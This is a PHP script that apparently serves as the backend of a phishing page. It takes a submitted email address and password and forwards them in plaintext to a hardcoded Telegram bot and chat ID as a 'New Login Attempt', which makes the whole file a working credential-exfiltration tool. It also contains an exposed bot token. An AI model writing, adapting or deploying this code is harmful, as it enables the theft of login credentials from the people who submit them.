<?php
// Secure Telegram Bot Token & Chat ID
$botToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
$chatId = "5613637159";

// Get POSTed email and password
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if ($email && $password) {
    $message = "🔒 New Login Attempt 🔒\n\n📧 Email: $email\n🔑 Password: $password";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = http_build_query([
        'chat_id' => $chatId,
        'text' => $message,
    ]);

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => $data,
        ],
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result) {
        echo json_encode(['status' => 'ok']);
    } else {
        echo json_encode(['status' => 'fail']);
    }
} else {
    echo json_encode(['status' => 'invalid']);
}
?>
